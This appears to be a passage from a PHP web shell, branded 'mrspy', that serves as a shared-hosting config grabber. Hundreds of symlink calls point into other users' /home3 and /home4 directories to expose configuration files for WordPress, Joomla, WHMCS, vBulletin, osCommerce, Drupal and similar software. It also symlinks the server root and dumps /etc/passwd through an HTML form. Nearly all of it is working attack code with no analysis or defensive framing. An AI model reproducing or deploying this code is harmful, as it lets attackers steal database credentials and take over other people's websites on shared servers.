@symlink('/home3/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-shop-zencart.txt'); 
@symlink('/home3/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-shop-ZCshop.txt'); 
@symlink('/home3/'.$user.'/public_html/Settings.php',$user.'-smf.txt'); 
@symlink('/home3/'.$user.'/public_html/smf/Settings.php',$user.'-smf2.txt'); 
@symlink('/home3/'.$user.'/public_html/forum/Settings.php',$user.'-smf-forum.txt'); 
@symlink('/home3/'.$user.'/public_html/forums/Settings.php',$user.'-smf-forums.txt'); 
@symlink('/home3/'.$user.'/public_html/upload/includes/config.php',$user.'-up.txt');
@symlink('/home3/'.$user.'/public_html/article/config.php',$user.'-Nwahy.txt'); 
@symlink('/home3/'.$user.'/public_html/up/includes/config.php',$user.'-up2.txt');
@symlink('/home3/'.$user.'/public_html/conf_global.php',$user.'-6.txt');
@symlink('/home3/'.$user.'/public_html/include/db.php',$user.'-7.txt');
@symlink('/home3/'.$user.'/public_html/connect.php',$user.'-PHP-Fusion.txt');
@symlink('/home3/'.$user.'/public_html/mk_conf.php',$user.'-9.txt');
@symlink('/home3/'.$user.'/public_html/includes/config.php',$user.'-traidnt1.txt');
@symlink('/home3/'.$user.'/public_html/config.php',$user.'-4images.txt');
@symlink('/home3/'.$user.'/public_html/sites/default/settings.php',$user.'-Drupal.txt');
@symlink('/home3/'.$user.'/public_html/member/configuration.php',$user.'-1member.txt') ; 
@symlink('/home3/'.$user.'/public_html/supports/includes/iso4217.php',$user.'-hostbills-supports.txt');
@symlink('/home3/'.$user.'/public_html/client/includes/iso4217.php',$user.'-hostbills-client.txt');
@symlink('/home3/'.$user.'/public_html/support/includes/iso4217.php',$user.'-hostbills-support.txt');
@symlink('/home3/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-hostbills-billing.txt');
@symlink('/home3/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-hostbills-billings.txt');
@symlink('/home3/'.$user.'/public_html/host/includes/iso4217.php',$user.'-hostbills-host.txt');
@symlink('/home3/'.$user.'/public_html/hosts/includes/iso4217.php',$user.'-hostbills-hosts.txt');
@symlink('/home3/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-hostbills-hosting.txt');
@symlink('/home3/'.$user.'/public_html/hostings/includes/iso4217.php',$user.'-hostbills-hostings.txt');
@symlink('/home3/'.$user.'/public_html/includes/iso4217.php',$user.'-hostbills.txt');
@symlink('/home3/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-hostbills-hostbills.txt');
@symlink('/home3/'.$user.'/public_html/hostbill/includes/iso4217.php',$user.'-hostbills-hostbill.txt');
@symlink('/home3/'.$user.'/public_html/cart/configuration.php',$user.'-cart-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/hosting/configuration.php',$user.'-hosting-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/buy/configuration.php',$user.'-buy-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/checkout/configuration.php',$user.'-checkout-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/host/configuration.php',$user.'-host-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/shop/configuration.php',$user.'-shop-WHMCS.txt');

@symlink('/home3/'.$user.'/public_html/shopping/configuration.php',$user.'-shopping-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/sale/configuration.php',$user.'-sale-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/client/configuration.php',$user.'-client-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/support/configuration.php',$user.'-support-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clientsupport/configuration.php',$user.'-clientsupport-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whm/whmcs/configuration.php',$user.'-whm-whmcs.txt');
@symlink('/home3/'.$user.'/public_html/whm/WHMCS/configuration.php',$user.'-whm-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmc/WHM/configuration.php',$user.'-whmc-WHM.txt');
@symlink('/home3/'.$user.'/public_html/whmcs/configuration.php',$user.'-whmc-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/supp/configuration.php',$user.'-supp-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/secure/configuration.php',$user.'-sucure-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/secure/whm/configuration.php',$user.'-sucure-whm-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-sucure-whmcs-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/panel/configuration.php',$user.'-panel-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/hosts/configuration.php',$user.'-hosts-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/submitticket.php',$user.'-submitticket-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clients/configuration.php',$user.'-clients-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clientes/configuration.php',$user.'-clientes-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/cliente/configuration.php',$user.'-client-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/billing/configuration.php',$user.'-billing-WHMCS.txt'); 
@symlink('/home3/'.$user.'/public_html/manage/configuration.php',$user.'-whm-manage-WHMCS.txt'); 
@symlink('/home3/'.$user.'/public_html/my/configuration.php',$user.'-whm-my-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/myshop/configuration.php',$user.'-whm-myshop-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/billings/configuration.php',$user.'-billings-WHMCS.txt') ; 
@symlink('/home3/'.$user.'/public_html/supports/configuration.php',$user.'-supports-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/auto/configuration.php',$user.'-auto-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/go/configuration.php',$user.'-go-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/'.$user.'/configuration.php',$user.'-USERNAME-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/bill/configuration.php',$user.'-bill-WHMCS.txt'); 
@symlink('/home3/'.$user.'/public_html/payment/configuration.php',$user.'-payment-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/pay/configuration.php',$user.'-pay-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/purchase/configuration.php',$user.'-purchase-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clientarea/configuration.php',$user.'-clientarea-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/autobuy/configuration.php',$user.'-autobuy-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/includes/configure.php',$user.'-shop.txt');
@symlink('/home4/'.$user.'/public_html/os/includes/configure.php',$user.'-shop-os.txt');
@symlink('/home4/'.$user.'/public_html/oscom/includes/configure.php',$user.'-oscom.txt');
@symlink('/home4/'.$user.'/public_html/oscommerce/includes/configure.php',$user.'-oscommerce.txt');
@symlink('/home4/'.$user.'/public_html/oscommerces/includes/configure.php',$user.'-oscommerces.txt');
@symlink('/home4/'.$user.'/public_html/shop/includes/configure.php',$user.'-shop2.txt');
@symlink('/home4/'.$user.'/public_html/shopping/includes/configure.php',$user.'-shop-shopping.txt');
@symlink('/home4/'.$user.'/public_html/sale/includes/configure.php',$user.'-sale.txt');
@symlink('/home4/'.$user.'/public_html/amember/config.inc.php',$user.'-amember.txt');
@symlink('/home4/'.$user.'/public_html/config.inc.php',$user.'-amember2.txt');
@symlink('/home4/'.$user.'/public_html/members/configuration.php',$user.'-members.txt');
@symlink('/home4/'.$user.'/public_html/config.php',$user.'-4images1.txt');
@symlink('/home4/'.$user.'/public_html/forum/includes/config.php',$user.'-forum.txt');
@symlink('/home4/'.$user.'/public_html/forums/includes/config.php',$user.'-forums.txt');
@symlink('/home4/'.$user.'/public_html/admin/conf.php',$user.'-5.txt');
@symlink('/home4/'.$user.'/public_html/admin/config.php',$user.'-4.txt');
@symlink('/home4/'.$user.'/public_html/wp-config.php',$user.'-wp13.txt');
@symlink('/home4/'.$user.'/public_html/wp/wp-config.php',$user.'-wp13-wp.txt');
@symlink('/home4/'.$user.'/public_html/WP/wp-config.php',$user.'-wp13-WP.txt');
@symlink('/home4/'.$user.'/public_html/wp/beta/wp-config.php',$user.'-wp13-wp-beta.txt');
@symlink('/home4/'.$user.'/public_html/beta/wp-config.php',$user.'-wp13-beta.txt');
@symlink('/home4/'.$user.'/public_html/press/wp-config.php',$user.'-wp13-press.txt');
@symlink('/home4/'.$user.'/public_html/wordpress/wp-config.php',$user.'-wp13-wordpress.txt');
@symlink('/home4/'.$user.'/public_html/Wordpress/wp-config.php',$user.'-wp13-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/blog/wp-config.php',$user.'-wp13-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/wordpress/beta/wp-config.php',$user.'-wp13-wordpress-beta.txt');
@symlink('/home4/'.$user.'/public_html/news/wp-config.php',$user.'-wp13-news.txt');
@symlink('/home4/'.$user.'/public_html/new/wp-config.php',$user.'-wp13-new.txt');
@symlink('/home4/'.$user.'/public_html/blog/wp-config.php',$user.'-wp-blog.txt');
@symlink('/home4/'.$user.'/public_html/beta/wp-config.php',$user.'-wp-beta.txt');
@symlink('/home4/'.$user.'/public_html/blogs/wp-config.php',$user.'-wp-blogs.txt');
@symlink('/home4/'.$user.'/public_html/home4/wp-config.php',$user.'-wp-home4.txt');
@symlink('/home4/'.$user.'/public_html/protal/wp-config.php',$user.'-wp-protal.txt');
@symlink('/home4/'.$user.'/public_html/site/wp-config.php',$user.'-wp-site.txt');
@symlink('/home4/'.$user.'/public_html/main/wp-config.php',$user.'-wp-main.txt');
@symlink('/home4/'.$user.'/public_html/test/wp-config.php',$user.'-wp-test.txt');
@symlink('/home4/'.$user.'/public_html/arcade/functions/dbclass.php',$user.'-ibproarcade.txt');
@symlink('/home4/'.$user.'/public_html/arcade/functions/dbclass.php',$user.'-ibproarcade.txt');
@symlink('/home4/'.$user.'/public_html/joomla/configuration.php',$user.'-joomla2.txt');
@symlink('/home4/'.$user.'/public_html/protal/configuration.php',$user.'-joomla-protal.txt');
@symlink('/home4/'.$user.'/public_html/joo/configuration.php',$user.'-joo.txt');
@symlink('/home4/'.$user.'/public_html/cms/configuration.php',$user.'-joomla-cms.txt');
@symlink('/home4/'.$user.'/public_html/site/configuration.php',$user.'-joomla-site.txt');
@symlink('/home4/'.$user.'/public_html/main/configuration.php',$user.'-joomla-main.txt');
@symlink('/home4/'.$user.'/public_html/news/configuration.php',$user.'-joomla-news.txt');
@symlink('/home4/'.$user.'/public_html/new/configuration.php',$user.'-joomla-new.txt');
@symlink('/home4/'.$user.'/public_html/home4/configuration.php',$user.'-joomla-home4.txt');
@symlink('/home4/'.$user.'/public_html/vb/includes/config.php',$user.'-vb-config.txt');
@symlink('/home4/'.$user.'/public_html/vb3/includes/config.php',$user.'-vb3-config.txt');
@symlink('/home4/'.$user.'/public_html/cc/includes/config.php',$user.'-vb1-config.txt');
@symlink('/home4/'.$user.'/public_html/includes/config.php',$user.'-includes-vb.txt');
@symlink('/home4/'.$user.'/public_html/forum/includes/class_core.php',$user.'-vbluttin-class_core.php.txt');
@symlink('/home4/'.$user.'/public_html/vb/includes/class_core.php',$user.'-vbluttin-class_core.php1.txt');
@symlink('/home4/'.$user.'/public_html/cc/includes/class_core.php',$user.'-vbluttin-class_core.php2.txt');
@symlink('/home4/'.$user.'/public_html/configuration.php',$user.'-joomla.txt');
@symlink('/home4/'.$user.'/public_html/includes/dist-configure.php',$user.'-zencart.txt'); 
@symlink('/home4/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-shop-zencart.txt'); 
@symlink('/home4/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-shop-ZCshop.txt'); 
@symlink('/home4/'.$user.'/public_html/Settings.php',$user.'-smf.txt'); 
@symlink('/home4/'.$user.'/public_html/smf/Settings.php',$user.'-smf2.txt'); 
@symlink('/home4/'.$user.'/public_html/forum/Settings.php',$user.'-smf-forum.txt'); 
@symlink('/home4/'.$user.'/public_html/forums/Settings.php',$user.'-smf-forums.txt'); 
@symlink('/home4/'.$user.'/public_html/upload/includes/config.php',$user.'-up.txt');
@symlink('/home4/'.$user.'/public_html/article/config.php',$user.'-Nwahy.txt'); 
@symlink('/home4/'.$user.'/public_html/up/includes/config.php',$user.'-up2.txt');
@symlink('/home4/'.$user.'/public_html/conf_global.php',$user.'-6.txt');
@symlink('/home4/'.$user.'/public_html/include/db.php',$user.'-7.txt');
@symlink('/home4/'.$user.'/public_html/connect.php',$user.'-PHP-Fusion.txt');
@symlink('/home4/'.$user.'/public_html/mk_conf.php',$user.'-9.txt');
@symlink('/home4/'.$user.'/public_html/includes/config.php',$user.'-traidnt1.txt');
@symlink('/home4/'.$user.'/public_html/config.php',$user.'-4images.txt');
@symlink('/home4/'.$user.'/public_html/sites/default/settings.php',$user.'-Drupal.txt');
@symlink('/home4/'.$user.'/public_html/member/configuration.php',$user.'-1member.txt') ; 
@symlink('/home4/'.$user.'/public_html/supports/includes/iso4217.php',$user.'-hostbills-supports.txt');
@symlink('/home4/'.$user.'/public_html/client/includes/iso4217.php',$user.'-hostbills-client.txt');
@symlink('/home4/'.$user.'/public_html/support/includes/iso4217.php',$user.'-hostbills-support.txt');
@symlink('/home4/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-hostbills-billing.txt');
@symlink('/home4/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-hostbills-billings.txt');
@symlink('/home4/'.$user.'/public_html/host/includes/iso4217.php',$user.'-hostbills-host.txt');
@symlink('/home4/'.$user.'/public_html/hosts/includes/iso4217.php',$user.'-hostbills-hosts.txt');
@symlink('/home4/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-hostbills-hosting.txt');
@symlink('/home4/'.$user.'/public_html/hostings/includes/iso4217.php',$user.'-hostbills-hostings.txt');
@symlink('/home4/'.$user.'/public_html/includes/iso4217.php',$user.'-hostbills.txt');
@symlink('/home4/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-hostbills-hostbills.txt');
@symlink('/home4/'.$user.'/public_html/hostbill/includes/iso4217.php',$user.'-hostbills-hostbill.txt');
@symlink('/home4/'.$user.'/public_html/cart/configuration.php',$user.'-cart-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/hosting/configuration.php',$user.'-hosting-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/buy/configuration.php',$user.'-buy-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/checkout/configuration.php',$user.'-checkout-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/host/configuration.php',$user.'-host-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/shop/configuration.php',$user.'-shop-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/shopping/configuration.php',$user.'-shopping-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/sale/configuration.php',$user.'-sale-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/client/configuration.php',$user.'-client-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/support/configuration.php',$user.'-support-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clientsupport/configuration.php',$user.'-clientsupport-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whm/whmcs/configuration.php',$user.'-whm-whmcs.txt');
@symlink('/home4/'.$user.'/public_html/whm/WHMCS/configuration.php',$user.'-whm-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmc/WHM/configuration.php',$user.'-whmc-WHM.txt');
@symlink('/home4/'.$user.'/public_html/whmcs/configuration.php',$user.'-whmc-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/supp/configuration.php',$user.'-supp-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/secure/configuration.php',$user.'-sucure-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/secure/whm/configuration.php',$user.'-sucure-whm-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-sucure-whmcs-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/panel/configuration.php',$user.'-panel-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/hosts/configuration.php',$user.'-hosts-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/submitticket.php',$user.'-submitticket-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clients/configuration.php',$user.'-clients-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clientes/configuration.php',$user.'-clientes-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/cliente/configuration.php',$user.'-client-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/billing/configuration.php',$user.'-billing-WHMCS.txt'); 
@symlink('/home4/'.$user.'/public_html/manage/configuration.php',$user.'-whm-manage-WHMCS.txt'); 
@symlink('/home4/'.$user.'/public_html/my/configuration.php',$user.'-whm-my-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/myshop/configuration.php',$user.'-whm-myshop-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/billings/configuration.php',$user.'-billings-WHMCS.txt') ; 
@symlink('/home4/'.$user.'/public_html/supports/configuration.php',$user.'-supports-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/auto/configuration.php',$user.'-auto-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/go/configuration.php',$user.'-go-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/'.$user.'/configuration.php',$user.'-USERNAME-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/bill/configuration.php',$user.'-bill-WHMCS.txt'); 
@symlink('/home4/'.$user.'/public_html/payment/configuration.php',$user.'-payment-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/pay/configuration.php',$user.'-pay-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/purchase/configuration.php',$user.'-purchase-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clientarea/configuration.php',$user.'-clientarea-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/autobuy/configuration.php',$user.'-autobuy-WHMCS.txt');
@symlink('/','mrspy/root');
}
echo "<a href='mrspy/root'>./ root</a><br>
<br>
<a href='mrspy'>./ Configurations</a><br>";
}
else
{
echo '<form method="POST">
<textarea name="passwd" style="border:1px dotted #59E817; width: 543px; height: 420px; background-color:#0C0C0C; font-family:Tahoma; font-size:8pt; color:#59E817">';flush();
$file = '/etc/passwd';
$read = @fopen($file, 'r');
if ($read){
$body = @fread($read, @filesize($file));
echo "".htmlentities($body)."";
}
elseif(!$read)
{
$read = @show_source($file) ;
}
elseif(!$read)
{
$read = @highlight_file($file);
}
elseif(!$read)
{
for($uid=0;$uid<1000;$uid++)
{
$ara = posix_getpwuid($uid);
if (!empty($ara))
{
while (list ($key, $val) = each($ara))
{
print "$val:";
}
print "\n";
}}}

flush();
 
echo '</textarea></br>
<p>&nbsp;</p>
<input name="m" size="80" value="Start" type="submit" style="border:1px dotted #59E817; width: 99; font-family:Tahoma; font-size:10pt; color:#59E817; text-transform:uppercase; height:23; background-color:#0C0C0C"/></br>
</form>';
}
echo '</body>
</html>';
}
?>